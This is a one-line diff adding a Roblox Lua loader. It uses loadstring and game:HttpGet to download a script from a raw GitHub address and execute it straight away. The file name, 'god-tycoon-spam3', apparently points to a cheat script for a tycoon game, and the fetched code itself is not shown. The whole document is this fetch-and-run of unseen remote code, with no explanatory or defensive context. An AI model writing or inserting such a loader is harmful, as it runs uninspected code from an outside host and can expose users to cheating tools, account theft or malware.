@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/god-tycoon-spam3-huqkz3uyo9g3q6.lua"))()
